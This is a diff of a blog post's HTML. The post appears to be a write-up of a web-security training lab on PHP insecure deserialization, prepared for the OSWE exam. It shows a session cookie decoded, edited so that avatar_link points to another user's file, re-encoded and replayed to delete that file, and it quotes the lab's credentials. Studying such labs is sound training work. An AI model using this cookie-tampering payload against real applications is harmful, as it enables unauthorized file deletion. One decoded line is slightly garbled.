@@ -92,7 +92,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="Lab-1-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#Lab-1-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="Lab 1: SQL injection UNION attack, determining the number of columns returned by the query"></a>Lab 1: SQL injection UNION attack, determining the number of columns returned by the query</h1>
       
     </div>
     <footer class="article-footer">
@@ -131,27 +131,29 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.)</p>
-<h1 id="Lab-3-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-3-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab 3: Using application functionality to exploit insecure deserialization"></a>Lab 3: Using application functionality to exploit insecure deserialization</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&#39;s home directory.</span><br><span class="line">You can access your own account using the following credentials: wiener:peter</span><br><span class="line">You also have access to a backup account: gregg:rosebud</span><br></pre></td></tr></table></figure>
+<h1 id="Lab-3-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-3-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab 3: Using application functionality to exploit insecure deserialization"></a>Lab 3: Using application functionality to exploit insecure deserialization</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><blockquote><p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.<br>You can access your own account using the following credentials: wiener:peter<br>You also have access to a backup account: gregg:rosebud</p>
+</blockquote>
 
 <h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol>
 <li><p>Notice that “My Account” Page Cookie after login:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: session&#x3D;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJOWDVsc21ucVI5TWZTb2wwQVZIRTRRbU40R3lsYW9yZSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>Decode the base64 cookie:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;NX5lsmnqR9MfSol0AVHE4QmN4Gylaore&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;O30%3d</span><br></pre></td></tr></table></figure>
-
 </li>
 </ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;NX5lsmnqR9MfSol0AVHE4QmN4Gylaore&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;O30%3d</span><br></pre></td></tr></table></figure>
+
 <p>Take note that <strong>avatar_link</strong> is referred in the cookie. Meanwhile, <strong>Delete Account</strong> button sends a post request to delete the current account. To delete the morale.txt file from Carlo’s home directory, it is clear that crafting the cookie and delete the account is one possible way.</p>
 <ol start="3">
-<li><p>Craft the cookie:</p>
+<li>Craft the cookie:</li>
+</ol>
 <pre>
 O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"OsTWRNgOgwIgdfjwDk6SgFT5iKZTbHx8";s:11:"avatar_link";<b>s:23:"/home/carlos/morale.txt"</b>;}
 </pre>
 
-</li>
-</ol>
-<p>Encode it with base64:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Ik9zVFdSTmdPZ3dJZ2RmandEazZTZ0ZUNWlLWlRiSHg4IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30&#x3D;</span><br></pre></td></tr></table></figure></p>
+<p>Encode it with base64:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Ik9zVFdSTmdPZ3dJZ2RmandEazZTZ0ZUNWlLWlRiSHg4IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30&#x3D;</span><br></pre></td></tr></table></figure>
+
 <ol start="4">
 <li>Replace the cookie with the crafted one when delete the account.</li>
 </ol>
